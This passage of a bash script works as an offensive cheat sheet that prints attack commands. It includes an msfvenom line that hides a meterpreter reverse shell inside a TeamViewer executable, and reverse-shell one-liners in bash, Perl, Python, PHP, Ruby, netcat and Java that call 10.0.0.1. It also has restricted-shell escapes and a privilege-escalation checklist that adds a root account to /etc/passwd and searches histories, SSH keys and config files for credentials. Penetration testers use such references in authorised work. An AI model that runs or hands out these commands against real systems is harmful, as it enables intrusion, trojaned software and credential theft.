msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe -x teamviewer.exe > encoded.exe
"
}

my_breakout(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===repair the shell after nc connection${RESET}
python -c 'import pty; pty.spawn(\"/bin/bash\")'
# OR
python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 200 rows 200
${BLUE}================================================================================
===rbash - Is this rbash (Restricted Bash)?${RESET}
$ vi
:set shell=/bin/sh
:shell

$ vim
:set shell=/bin/sh
:shell
${BLUE}================================================================================
===perl - Is perl present on the target machine?${RESET}
perl -e 'exec \"/bin/bash\";'
perl -e 'exec \"/bin/sh\";'
${BLUE}================================================================================
===AWK - Is AWK present on the target machine?${RESET}
awk 'BEGIN {system(\"/bin/bash -i\")}'
awk 'BEGIN {system(\"/bin/sh -i\")}'
${BLUE}================================================================================
===ed - Is ed present on the target machines?${RESET}
ed
!sh
${BLUE}================================================================================
===IRB - IRB Present on the target machine?${RESET}
exec '/bin/sh'
${BLUE}================================================================================
===Nmap - Is Nmap present on the target machine?${RESET}
nmap --interactive
nmap> !sh
${BLUE}================================================================================${RESET}
"
}


## reverseshell:
my_reverseshell(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUEBOLD}======Bash${RESET}"
echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

echo -e "${BLUEBOLD}======PERL${RESET}"
echo perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

echo -e "${BLUEBOLD}======Python${RESET}"
echo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

echo -e "${BLUEBOLD}======PHP${RESET}"
echo php -r '$sock=fsockopen("10.0.0.1",1w234);exec("/bin/sh -i <&3 >&3 2>&3");'

echo -e "${BLUEBOLD}======Ruby${RESET}"
echo ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

echo -e "${BLUEBOLD}======Netcat${RESET}"
echo nc -e /bin/sh 10.0.0.1 1234

echo -e "${BLUEBOLD}======java${RESET}"
echo 'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();'

echo -e "\n${RED}https://www.revshells.com/${RESET}\n"
}


my_linuxpriv(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===better shell on target ${RESET}
python -c 'import pty; pty.spawn(\"/bin/bash\")'
OR
python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
${BLUE}================================================================================${RESET}
${BLUE}===kernel?${RESET}
uname -a
cat /etc/*-release
${BLUE}===/etc/passwd writable?${RESET}
ls -lsa /etc/passwd

openssl passwd -1
password123
$1$v6KYhidX$D.NBumRd1Lsr3LCw4mFrj/
echo 'ibrahim:$1$v6KYhidX$D.NBumRd1Lsr3LCw4mFrj/:0:0:ibrahim:/home/ibrahim:/bin/bash' >> /etc/passwd
su ibrahim
id
${BLUE}===sudo?${RESET}
sudo -l
${BLUE}===environmental variables?${RESET}
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
${BLUE}===What has the user being doing? passwords?${RESET}
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
${BLUE}===Private-key information?${RESET}
cd ~/.ssh/
${BLUE}===file-systems mounted?${RESET}
mount
df -h
${BLUE}===Web Configs containing credentials?${RESET}
cd /var/www/html/
ls -lsaht
${BLUE}===SUID Binaries?${RESET}
find / -perm -u=s -type f 2>/dev/null
${BLUE}===GUID Binaries?${RESET}
find / -perm -g=s -type f 2>/dev/null
-> https://gtfobins.github.io/
${BLUE}===any sensitive on?${RESET}
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
${BLUE}===What does the local network look like?${RESET}
netstat -antup
netstat -tunlp
${BLUE}===Is anything vulnerable running as root?${RESET}
ps aux |grep -i 'root' --color=auto
${BLUE}===Are there any .secret files?${RESET}
ls -lsaht |grep -i '.secret' --color=aut 2>/dev/null
${BLUE}===cron jobs?${RESET}
crontab –u root –l
cat /etc/fstab
${BLUE}===Look for unusual system-wide cron jobs:${RESET}
cat /etc/crontab
ls /etc/cron.*
${BLUE}===What is every single file ibrahim has ever created?${RESET}
find / -user ibrahim 2>/dev/null
${BLUE}===Any backups??${RESET}
find / -type f \\( -name "*.bak" -o -name "*.sav" -o -name "*.backup" -o -name "*.old" \\) 2>/dev/null
${BLUE}===Any mail? mbox in User \$HOME directory?${RESET}
cd /var/mail/
ls -lsaht
${BLUE}===automation?${RESET}
Linpease
Traitor
${BLUE}===other resources${RESET}
'https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/'
'https://github.com/sleventyeleven/linuxprivchecker'
"
}
